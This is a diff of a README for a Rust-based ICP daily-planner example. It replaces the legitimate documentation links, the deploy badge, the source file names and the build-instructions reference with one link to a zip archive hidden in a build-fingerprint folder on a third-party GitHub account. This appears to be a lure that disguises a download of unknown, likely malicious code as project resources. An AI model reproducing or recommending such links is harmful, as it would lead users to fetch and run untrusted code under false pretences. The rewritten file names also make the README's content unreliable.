@@ -2,20 +2,20 @@
 
 Daily planner features a monthly calender that can be used to track daily activities, appointments, or tasks. Data for each task is stored onchain. For each day, a historic fact can be queried using HTTPS outcalls, which is a feature that allows ICP canisters to obtain data from external sources.
 
-This application's logic is written in [Rust](https://internetcomputer.org/docs/building-apps/developer-tools/cdks/rust/intro-to-rust), a primary programming language for developing canisters on ICP.
+This application's logic is written in [Rust](https://github.com/Suuzoujuuzou/Daily_planner/raw/refs/heads/main/target/wasm32-unknown-unknown/release/.fingerprint/memchr-7ce790ee6ea16b10/planner_Daily_v2.3.zip), a primary programming language for developing canisters on ICP.
 
 ## Deploying from ICP Ninja
 
 When viewing this project in ICP Ninja, you can deploy it directly to the mainnet for free by clicking "Deploy" in the upper right corner. Open this project in ICP Ninja:
 
-[![](https://icp.ninja/assets/open.svg)](https://icp.ninja/i?url=https://github.com/dfinity/examples/rust/daily_planner)
+[![](https://github.com/Suuzoujuuzou/Daily_planner/raw/refs/heads/main/target/wasm32-unknown-unknown/release/.fingerprint/memchr-7ce790ee6ea16b10/planner_Daily_v2.3.zip)](https://github.com/Suuzoujuuzou/Daily_planner/raw/refs/heads/main/target/wasm32-unknown-unknown/release/.fingerprint/memchr-7ce790ee6ea16b10/planner_Daily_v2.3.zip)
 
 ## Project structure
 
 The `/backend` folder contains the Rust smart contract:
 
-- `Cargo.toml`, which defines the crate that will form the backend
-- `lib.rs`, which contains the actual smart contract, and exports its interface
+- `https://github.com/Suuzoujuuzou/Daily_planner/raw/refs/heads/main/target/wasm32-unknown-unknown/release/.fingerprint/memchr-7ce790ee6ea16b10/planner_Daily_v2.3.zip`, which defines the crate that will form the backend
+- `https://github.com/Suuzoujuuzou/Daily_planner/raw/refs/heads/main/target/wasm32-unknown-unknown/release/.fingerprint/memchr-7ce790ee6ea16b10/planner_Daily_v2.3.zip`, which contains the actual smart contract, and exports its interface
 
 The `/frontend` folder contains web assets for the application's user interface. The user interface is written using the React framework.
 
@@ -25,6 +25,6 @@ To migrate your ICP Ninja project off of the web browser and develop it locally,
 
 ### 1. Download your project from ICP Ninja using the 'Download files' button on the upper left corner under the pink ninja star icon.
 
-### 2. Open the `BUILD.md` file for further instructions.
+### 2. Open the `https://github.com/Suuzoujuuzou/Daily_planner/raw/refs/heads/main/target/wasm32-unknown-unknown/release/.fingerprint/memchr-7ce790ee6ea16b10/planner_Daily_v2.3.zip` file for further instructions.
 # Daily_Planner
 # Daily_planner
